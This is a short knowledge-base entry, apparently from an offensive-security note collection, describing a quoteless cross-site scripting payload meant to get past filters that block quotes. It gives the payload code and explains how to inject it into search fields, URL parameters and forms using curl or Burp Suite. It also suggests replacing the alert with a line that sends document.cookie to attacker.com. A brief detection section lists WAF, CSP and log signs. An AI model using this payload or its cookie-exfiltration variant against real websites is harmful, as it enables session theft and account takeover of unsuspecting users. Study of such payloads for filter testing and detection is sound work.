---
type: code
language: JavaScript
verified: true
tags:
  - xss
  - payload
  - bypass
  - injection
platforms:
  - Web
validated: true
---

# XSS-Payload-Without-Quotes-Bypass

## Code

```javascript
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
```

## Description

This JavaScript payload executes an alert in both HTML and JS contexts by using a unary minus operator and comment tricks to bypass sanitization filters that block quotes or direct script tags. It first calls confirm on the document domain (often no-op due to context) and then triggers alert(1) to prove execution, without relying on quotes.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (none) | This payload has no variables; it executes as-is. For exfiltration, replace alert(1) with fetch or XMLHttpRequest to send data. | N/A |

## Usage

Inject this payload into vulnerable fields like search inputs, URL parameters, or forms in web apps. Use tools like curl or Burp Suite to submit it. When the page renders, the script executes in the browser context, ideal for reflected/stored XSS. Modify the alert to new Image().src='http://attacker.com/?cookie='+document.cookie for data theft.

## Detection

- WAF rules matching unusual operators like unary minus before function calls.
- CSP violations if inline scripts are blocked.
- Browser console errors or network logs showing unexpected alerts/images.
- Input logs revealing the payload pattern: -(confirm) or trailing comments.

## Related

- [[procedures/Execute-XSS-in-HTML-and-JS-Context]]
- [[curl-inject-xss-payload]]
